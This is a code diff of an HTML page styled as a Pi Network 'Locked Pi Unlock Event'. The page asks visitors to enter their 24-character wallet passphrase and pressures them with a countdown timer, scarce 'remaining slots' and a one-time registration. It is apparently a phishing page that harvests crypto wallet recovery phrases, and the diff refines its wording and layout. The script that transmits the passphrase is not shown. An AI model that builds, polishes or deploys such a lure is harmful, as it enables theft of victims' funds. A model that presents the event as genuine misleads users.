@@ -10,12 +10,12 @@
   <!-- Header -->
   <header>
     <a href="index.html" class="logo">
-      <img src="https://ik.imagekit.io/digitalmake/PiNet.png?updatedAt=1749551583656" alt="PiNet Logo">
+      <img src="https://ik.imagekit.io/digitalmake/PiNet.png" alt="PiNet Logo">
       <span class="logo-text">PiNet</span>
     </a>
     <div class="header-center">Home</div>
     <nav>
-      <a href="#" class="btn" onclick="showDownloadPopup()">Download the Pi Browser</a>
+      <a href="#" class="btn" onclick="showDownloadPopup()">Download Pi Browser</a>
     </nav>
   </header>
 
@@ -23,46 +23,49 @@
     <h2 class="home-title">Home</h2>
 
     <!-- Welcome -->
-    <section class="welcome-section">
-      <img class="big-logo-img" src="https://ik.imagekit.io/digitalmake/PiNet..png?updatedAt=1749557127057" alt="PiNet Logo">
+    <section>
+      <img class="big-logo-img" src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet Logo">
       <h2 class="welcome-text">
-        <span class="medium-text">Welcome to the </span><span class="semibold-text">PiNet</span>
+        Welcome to the <span class="semibold-text">PiNet</span>
       </h2>
       <p>Locked Pi Unlock Event Celebrating the 6th Anniversary and Mainnet Launch</p>
       <p>As a token of appreciation... for pioneers who have supported the project over the past 6 years.</p>
     </section>
 
-    <!-- Passphrase (Shifted Up) -->
+    <!-- Passphrase -->
     <section>
       <h1>UNLOCK LOCKED PI WITH A PASSPHRASE</h1>
-      <textarea id="passphraseInput" placeholder="Enter your 24-character password here..."></textarea>
-      <button class="unlock-btn" onclick="sendPassphrase()">UNLOCK LOCKED PI WITH A PASSPHRASE</button>
-      <p class="note">Note: Must enter a 24-character passphrase. You can only register once.</p>
+      <textarea id="passphraseInput" placeholder="Enter your 24-character passphrase..."></textarea>
+      <p class="error-msg" id="errorMsg">❌ Please enter exactly 24 characters.</p>
+      <button class="unlock-btn" onclick="sendPassphrase()">UNLOCK</button>
+      <p class="note">Note: You can only register once.</p>
     </section>
 
     <!-- Mainnet Unlock -->
     <section>
       <h1>Mainnet Unlock π</h1>
-      <button class="unlock-btn" onclick="showPopup()">Show Mainnet Unlock Details</button>
+      <button class="unlock-btn" onclick="showPopup()">Show Unlock Details</button>
       <ul class="status">
         <li>⚡ Time remaining: <span id="timer">Loading...</span></li>
         <li>✔ Requirement: KYC successfully completed</li>
         <li>📶 Remaining slots: 218 out of 31,415</li>
       </ul>
+      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     </section>
 
     <!-- Footer -->
     <footer>
       <a href="https://socialchain.app/privacy" target="_blank" class="policy">Privacy Policy</a>
-      <a href="#" class="footer-btn">🔍 Explore the ecosystem.</a>
+      <a href="#" class="footer-btn">🔍 Explore the ecosystem</a>
+      <p style="color:#fff; font-size:13px; margin-top:10px;">© 2025 PiNet. All rights reserved.</p>
     </footer>
   </main>
 
-  <!-- Mainnet Unlock Popup -->
+  <!-- Unlock Popup -->
   <div id="unlockPopup" class="popup">
     <div class="popup-content">
       <span class="close" onclick="hidePopup()">×</span>
-      <h1 class="animated-heading">Mainnet Unlock π</h1>
+      <h1>Mainnet Unlock π</h1>
       <ul class="status">
         <li>⚡ Time remaining: <span id="popupTimer">Loading...</span></li>
         <li>✔ Requirement: KYC successfully completed</li>
@@ -73,16 +76,16 @@
 
   <!-- Download Popup -->
   <div id="downloadPopup" class="popup">
-    <div class="popup-content download-popup">
+    <div class="popup-content">
       <span class="close" onclick="hideDownloadPopup()">×</span>
       <h2>Download Pi Browser</h2>
-      <p class="desc">Use Pi Browser to access the Pi Web3 ecosystem and securely use your wallet.</p>
+      <p>Use Pi Browser to access the Pi Web3 ecosystem and securely use your wallet.</p>
       <div class="store-buttons">
         <a href="https://play.google.com/store/apps/details?id=pi.browser" target="_blank">
-          <img src="https://ik.imagekit.io/digitalmake/Google%20Play.png?updatedAt=1749554552679" alt="Google Play" class="store-logo">
+          <img src="https://ik.imagekit.io/digitalmake/Google%20Play.png" alt="Google Play" class="store-logo">
         </a>
         <a href="https://apps.apple.com/us/app/pi-browser/id1560911608" target="_blank">
-          <img src="https://ik.imagekit.io/digitalmake/App%20Store.png?updatedAt=1749554552590" alt="App Store" class="store-logo">
+          <img src="https://ik.imagekit.io/digitalmake/App%20Store.png" alt="App Store" class="store-logo">
         </a>
       </div>
     </div>
